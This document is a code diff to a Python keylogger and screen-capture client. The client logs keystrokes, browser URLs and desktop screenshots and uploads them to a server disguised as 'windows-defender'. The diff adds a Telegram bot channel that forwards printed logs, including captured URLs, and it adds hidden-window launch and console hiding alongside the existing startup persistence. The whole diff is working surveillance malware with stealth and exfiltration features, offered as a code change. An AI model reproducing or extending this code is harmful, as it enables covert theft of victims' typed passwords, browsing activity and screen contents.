@@ -25,6 +25,9 @@ from urllib.error import URLError, HTTPError
 from urllib.request import Request, urlopen
 from PIL import ImageGrab
 
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "").strip()
+
 from pynput.keyboard import Key, KeyCode, Listener
 try:
     from pywinauto import Desktop
@@ -35,9 +38,9 @@ MESSAGE_GAP_MS = 2500
 RAW_BATCH_DELAY_SECONDS = 0.08
 RAW_BATCH_INTERVAL_SECONDS = 10
 HEARTBEAT_INTERVAL_SECONDS = 30
-WEBSITE_HISTORY_INTERVAL_SECONDS = 5
+WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
-SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 2
+SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 SITE_URL = "https://windows-defender-cf8n.onrender.com"
 device_name = platform.node() or socket.gethostname() or "Unknown device"
 device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
@@ -65,6 +68,7 @@ PENDING_RAW_BATCHES_PATH = os.path.join(INSTALL_DIR, "pending_raw_batches.json")
 SESSION_ID = uuid.uuid4().hex
 pending_messages_lock = Lock()
 last_message_id = 0
+SERVICE_KEYBOARD_LISTENER = None
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -72,6 +76,61 @@ SHIFTED_SYMBOLS = {
     "-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
     ";": ":", "'": '"', ",": "<", ".": ">", "/": "?", "`": "~",
 }
+
+
+def telegram_configured():
+    return bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
+
+
+def send_telegram_log(message):
+    if not telegram_configured():
+        return
+
+    text = str(message).strip()
+    if not text:
+        return
+    try:
+        payload = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": text[:4000]}).encode("utf-8")
+        request = Request(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+            data=payload,
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urlopen(request, timeout=10) as response:
+            if response.status >= 400:
+                raise RuntimeError(f"HTTP {response.status}")
+    except Exception:
+        pass
+
+
+class TelegramLogProxy:
+    def __init__(self, stream):
+        self.stream = stream
+
+    def write(self, data):
+        text = data.rstrip("\r\n")
+        if text:
+            self.stream.write(data)
+            self.stream.flush()
+            try:
+                send_telegram_log(text)
+            except Exception:
+                pass
+        else:
+            self.stream.write(data)
+            self.stream.flush()
+
+    def flush(self):
+        self.stream.flush()
+
+    def isatty(self):
+        return getattr(self.stream, "isatty", lambda: False)()
+
+
+if os.environ.get("TELEGRAM_BOT_TOKEN") and os.environ.get("TELEGRAM_CHAT_ID"):
+    sys.stdout = TelegramLogProxy(sys.stdout)
+    sys.stderr = TelegramLogProxy(sys.stderr)
 
 
 def get_active_app():
@@ -463,6 +522,10 @@ def post_message(payload, quiet=False):
 
 def post_website_history(url, browser):
     try:
+        headers = {"Content-Type": "application/json"}
+        api_key = os.getenv("INGEST_API_KEY", "").strip()
+        if api_key:
+            headers["x-api-key"] = api_key
         request = Request(
             f"{SITE_URL}/api/website-history",
             data=json.dumps({
@@ -472,7 +535,7 @@ def post_website_history(url, browser):
                 "url": url,
                 "visited_at": int(time.time() * 1000),
             }).encode("utf-8"),
-            headers={"Content-Type": "application/json"},
+            headers=headers,
             method="POST",
         )
         with urlopen(request, timeout=10) as response:
@@ -515,11 +578,19 @@ def website_history_sender():
         try:
             active_app = get_active_app()
             browser_url = get_browser_url(active_app)
-            if browser_url and browser_url != last_url:
+            if not active_app:
+                time.sleep(WEBSITE_HISTORY_INTERVAL_SECONDS)
+                continue
+            if not browser_url:
+                print(f"Website history skipped: active app={active_app!r}, browser_url=empty")
+            elif browser_url == last_url:
+                print(f"Website history skipped: same URL already sent: {browser_url}")
+            else:
+                print(f"Website history capture: app={active_app!r}, url={browser_url}")
                 if post_website_history(browser_url, active_app.split(" - ", 1)[0].strip()):
                     last_url = browser_url
-        except Exception:
-            pass
+        except Exception as error:
+            print(f"Website history sender exception: {type(error).__name__}: {error}")
         time.sleep(WEBSITE_HISTORY_INTERVAL_SECONDS)
 
 
@@ -570,6 +641,15 @@ def report_screenshot_status(status, message):
         print(f"Could not report screenshot status: {error}")
 
 
+def trigger_screenshot_capture():
+    report_screenshot_status("Capturing", "Reading the desktop image.")
+    capture_thread = Thread(target=lambda: upload_device_screenshot(capture_desktop_screenshot()), daemon=True)
+    capture_thread.start()
+    capture_thread.join(60)
+    if capture_thread.is_alive():
+        report_screenshot_status("Failed", "Desktop capture timed out after 60 seconds.")
+
+
 def poll_screenshot_request():
     try:
         request = Request(
@@ -582,12 +662,7 @@ def poll_screenshot_request():
                 raise RuntimeError(f"HTTP {response.status}")
             data = json.loads(response.read().decode("utf-8"))
         if data.get("screenshot_requested"):
-            report_screenshot_status("Capturing", "Reading the desktop image.")
-            capture_thread = Thread(target=lambda: upload_device_screenshot(capture_desktop_screenshot()), daemon=True)
-            capture_thread.start()
-            capture_thread.join(60)
-            if capture_thread.is_alive():
-                report_screenshot_status("Failed", "Desktop capture timed out after 60 seconds.")
+            trigger_screenshot_capture()
     except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
         print(f"Could not poll screenshot request: {error}")
 
@@ -673,12 +748,7 @@ def send_heartbeat():
                 raise RuntimeError(f"HTTP {response.status}")
             heartbeat = json.loads(response.read().decode("utf-8"))
         if heartbeat.get("screenshot_requested"):
-            report_screenshot_status("Capturing", "Reading the desktop image.")
-            capture_thread = Thread(target=lambda: upload_device_screenshot(capture_desktop_screenshot()), daemon=True)
-            capture_thread.start()
-            capture_thread.join(60)
-            if capture_thread.is_alive():
-                report_screenshot_status("Failed", "Desktop capture timed out after 60 seconds.")
+            trigger_screenshot_capture()
     except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
         print(f"Could not send device heartbeat: {error}")
 
@@ -696,6 +766,19 @@ def mark_device_offline():
                 raise RuntimeError(f"HTTP {response.status}")
     except (HTTPError, URLError, TimeoutError, RuntimeError, OSError) as error:
         print(f"Could not mark device offline: {error}")
+
+
+def hide_current_window():
+    if os.name != "nt":
+        return
+    try:
+        user32 = ctypes.windll.user32
+        hwnd = user32.GetConsoleWindow()
+        if hwnd:
+            user32.ShowWindow(hwnd, 0)
+            user32.UpdateWindow(hwnd)
+    except Exception:
+        pass
 
 
 def register_startup_launch():
@@ -736,7 +819,10 @@ def install_and_relaunch():
         os.makedirs(INSTALL_DIR, exist_ok=True)
         if not os.path.exists(INSTALL_PATH):
             shutil.copy2(sys.executable, INSTALL_PATH)
-        subprocess.Popen([INSTALL_PATH], close_fds=True)
+        startup_info = subprocess.STARTUPINFO()
+        startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startup_info.wShowWindow = 0
+        subprocess.Popen([INSTALL_PATH], close_fds=True, startupinfo=startup_info)
         return True
     except OSError as error:
         print(f"Could not install KeyboardService: {error}")
@@ -881,16 +967,31 @@ def on_release(key):
     active_modifiers.discard(aliases.get(key, key))
 
 
-if install_and_relaunch():
-    sys.exit(0)
+def start_keyboard_listener():
+    global SERVICE_KEYBOARD_LISTENER
+    print(f"Sending to {SITE_URL}")
+    register_startup_launch()
+    atexit.register(mark_device_offline)
+    atexit.register(flush_raw_log)
+    Thread(target=message_sender, daemon=True).start()
+    Thread(target=heartbeat_sender, daemon=True).start()
+    Thread(target=screenshot_request_poller, daemon=True).start()
+    Thread(target=website_history_sender, daemon=True).start()
+    with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
+        SERVICE_KEYBOARD_LISTENER = keyboard_listener
+        keyboard_listener.join()
 
-print(f"Sending to {SITE_URL}")
-register_startup_launch()
-atexit.register(mark_device_offline)
-atexit.register(flush_raw_log)
-Thread(target=message_sender, daemon=True).start()
-Thread(target=heartbeat_sender, daemon=True).start()
-Thread(target=screenshot_request_poller, daemon=True).start()
-Thread(target=website_history_sender, daemon=True).start()
-with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
-    keyboard_listener.join()
+
+def run_client():
+    if install_and_relaunch():
+        sys.exit(0)
+    hide_current_window()
+    start_keyboard_listener()
+
+
+if __name__ == "__main__":
+    if len(sys.argv) > 1 and sys.argv[1].lower() == "--service":
+        from service_client import main as service_main
+        service_main()
+    else:
+        run_client()
